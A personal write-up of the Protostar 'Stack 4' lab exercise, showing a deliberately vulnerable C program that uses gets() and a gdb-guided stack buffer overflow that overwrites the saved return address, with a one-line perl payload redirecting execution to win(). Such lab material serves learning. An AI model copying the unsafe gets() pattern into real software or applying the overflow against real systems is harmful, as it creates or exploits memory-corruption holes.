
___________________________________________ EXPLOIT EXERCISES _________________________________________
			
========= Abhinav Thakur
========= compilepeace@gmail.com


######### PROTOSTAR

                                  =-=-=-=-=-=   STACK - 4   =-=-=-=-=




1.	First I log into the virtual machine with
		username : user
		password : user



2.	Source code provided is - 

	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	void win()
	{
	  printf("code flow successfully changed\n");
	}

	int main(int argc, char **argv)
	{
	  char buffer[64];

	  gets(buffer);
	}


3.	This challenge consists of overwritting 'instruction pointer' which in our case will be
	'eip' (for 32-bit architecture). We'll take help of gdb for this challenge.	
	First we set a breakpoint on the instruction just after 'gets()' at leave instruction 
	and then we check the value at instruction pointer analysing where it returns at the
	'ret' instruction (in the disassemly of main) or we can simply refer to eip by adding 
	4 bytes to base pointer register (ebp). (i.e. x/xw $ebp+4 in gdb to examine EIP since
	EIP is stored just after (at higher memory address) ebp (saved frame pointer) on stack).
	Then analysing the memory at stack pointer just after the user input, we check for how 
	far does the instruction pointer value lie and then overwrite the 4 bytes of EIP with
	the address of the 'win()' (0x080483f4) (which we can find by 'nm' command in the 
	symbols of object files as done in previous challenge).
	Ofcourse there is some compiler padding and 'ebp' (base pointer register) which you 
	overwrite before overwriting the EIP.

		$ perl -e 'print "\x41"x76 . "\xf4\x83\x04\x08"' | ./stack4
		Code flow successfully changed
		Segmentation fault


	Cheers, 	